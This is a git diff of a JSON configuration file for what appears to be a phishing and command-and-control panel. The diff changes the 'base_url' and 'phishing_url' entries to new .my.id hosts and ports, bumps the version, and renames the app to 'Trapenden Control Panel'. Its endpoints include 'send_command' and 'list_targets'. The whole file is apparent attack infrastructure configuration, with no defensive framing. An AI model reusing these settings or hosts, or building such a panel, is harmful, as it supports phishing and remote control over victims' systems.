@@ -1,8 +1,8 @@
 {
-  "base_url": "http://aanx.aanzload.my.id:2000",
-  "phishing_url": "http://aanx.aanzload.my.id:2001",
-  "version": "1.0.0",
-  "app_name": "AANZ Control Panel",
+  "base_url": "http://jscloud.my.id:2002",
+  "phishing_url": "http://jscloud.my.id:2004",
+  "version": "5.0.0",
+  "app_name": "Trapenden Control Panel",
   "endpoints": {
     "send_command": "/api/send-command",
     "list_targets": "/api/list-targets",
